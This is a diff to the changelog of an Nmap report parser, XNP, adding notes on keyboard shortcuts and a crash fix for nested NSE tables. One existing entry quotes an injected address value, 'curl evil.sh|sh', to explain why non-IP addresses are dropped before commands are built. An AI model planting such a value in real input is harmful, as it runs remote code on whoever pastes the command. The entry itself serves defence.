@@ -72,12 +72,21 @@ Released versions of [XNP](https://github.com/xtormin/XtremeNmapParser).
 - **The query-language help is behind an info button** next to *Clear*, instead
   of holding a paragraph under the search bar on every tab for ever. The choice
   is remembered.
+- The report's keyboard shortcuts keep their hands off the text fields. `/`
+  focuses the search box and `j`/`k` walk the rows, but only when the focus is
+  not typing in one: the rescan arguments carry paths, and a `/` that escapes
+  halfway through `-oN /tmp/out` leaves the box unusable.
 - The footer links to the project on GitHub.
 - Addresses are validated before they reach a command line. `addr` is CDATA in
   `nmap.dtd`, so a report claiming `addr="10.0.0.1; curl evil.sh|sh"` is a valid
   one — and these commands are meant to be pasted into a shell. Anything that is
   not an IP address is dropped rather than escaped, on both the Python and the
   JavaScript side.
+- **An NSE table nested inside another no longer brings the run down.** The
+  parser's recursive step looked for itself where it was not, so any `<script>`
+  carrying a `<table>` inside another one — the ordinary output of `ssl-cert`,
+  `ssl-enum-ciphers` and the `smb-*` scripts — ended in an `AttributeError`,
+  with `-f` and with `-d` alike.
 
 - **A directory run now merges and descends by default.** `xnp -d nmap/` is the
   whole command: `-M` and `-R` are no longer needed (they still parse, so
